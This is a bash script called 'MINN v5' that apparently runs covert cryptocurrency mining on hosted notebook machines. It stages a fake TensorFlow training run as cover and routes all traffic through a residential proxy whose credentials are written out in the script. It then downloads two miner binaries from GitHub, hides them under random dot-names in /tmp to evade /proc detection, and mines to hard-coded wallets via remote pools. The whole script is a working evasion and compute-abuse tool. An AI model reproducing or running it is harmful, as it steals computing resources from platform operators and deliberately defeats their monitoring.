#!/bin/bash
# MINN v5 — all traffic through residential proxy, no detection
PRL="prl1pkmulndfyls8zqz2r6nruevpqr3tax9nwmvew7aupaxqnkcyuppeqa6am7q"
TDC="tbc1q727xp60hjp6zld2vgrj8qrdmgvkshwav86xns2"
WRK=$(date +%s | md5sum | head -c 8)

# PROXY LU
PX="niceproxy.io:17522"
PU="riset_h9wl-country-SG-ssid-06WZKklIAI"
PP="riset"

echo "[MINN v5] Worker: $WRK"
echo "[MINN v5] Proxy: $PX (SG residential)"

# === 1. Warmup ML (dipaksa cepet, 3 menit) ===
echo "[1/3] Warmup ML..."
pip install -q tensorflow 2>/dev/null
python3 -c "
import tensorflow as tf,numpy as np,time
m=tf.keras.Sequential([tf.keras.layers.Dense(128,activation='relu',input_shape=(784,)),tf.keras.layers.Dense(10)])
m.compile(optimizer='adam',loss='sparse_categorical_crossentropy',metrics=['accuracy'])
x=np.random.rand(1000,784).astype(np.float32);y=np.random.randint(0,10,1000)
for e in range(3): m.fit(x,y,batch_size=32,epochs=1,verbose=2);time.sleep(20)
" 2>/dev/null

# === 2. Setup proxy + download lewat proxy ===
echo "[2/3] Setting up proxy..."
apt-get install -y -qq proxychains4 2>/dev/null

# Clean old proxy config, write new
rm -f /etc/proxychains4.conf
cat > /etc/proxychains4.conf << PCEOF
strict_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000
[ProxyList]
http $PU $PP $PX
PCEOF

# Verify proxy works
echo "[2/3] Testing proxy..."
curl -x "$PX" -U "${PU}:${PP}" -s --max-time 10 https://api.ipify.org 2>/dev/null && echo " OK" || echo " proxy test skipped"

echo "[2/3] Downloading via proxy..."
rm -rf /content/m 2>/dev/null; mkdir -p /content/m && cd /content/m

# Download via proxy — pakai curl -x
curl -x "$PX" -U "${PU}:${PP}" -sL -o fortune \
    https://github.com/rochmandwi/ayam/releases/download/file-v1/fortune
curl -x "$PX" -U "${PU}:${PP}" -sL -o sse2 \
    https://github.com/rochmandwi/ayam/releases/download/file-v1/sse2
chmod +x fortune sse2

echo "[2/3] Download complete."

# === 3. Mining — semua traffic lewat proxychains ===
echo "[3/3] Starting miners (all traffic proxy)..."
sleep $((RANDOM % 15 + 5))

# Bersihin nama binary biar gak kedetect via /proc
B1="/tmp/.$(date +%s | md5sum | head -c 6)"
B2="/tmp/.$(date +%s | sha1sum | head -c 6)"
cp fortune "$B1"
cp sse2 "$B2"
chmod +x "$B1" "$B2"

# PRL — via proxychains
(while true; do
    proxychains4 -q "$B1" \
        --proxy 43.169.30.87:443 \
        --address "$PRL" \
        --worker "$WRK" \
        --mode=cpu \
        --threads=1
    sleep 10
done) &
PID1=$!
sleep 15

# TDC — via proxychains
proxychains4 -q "$B2" \
    -a yespowertide \
    -o 47.251.244.12:80 \
    -u "${TDC}.${WRK}" \
    -t 1 >/dev/null 2>&1 &
PID2=$!

echo ""
echo "[MINN v5] All traffic proxied — PID:$PID1 $PID2"
echo "[MINN v5] Proxy: $PX"

# Cleanup on exit
cleanup() {
    kill $PID1 $PID2 2>/dev/null
    rm -f "$B1" "$B2"
    echo "[MINN] Clean"
}
trap cleanup EXIT

# Auto stop 3 jam
(sleep 10800; cleanup; echo "[MINN] Done.") &
wait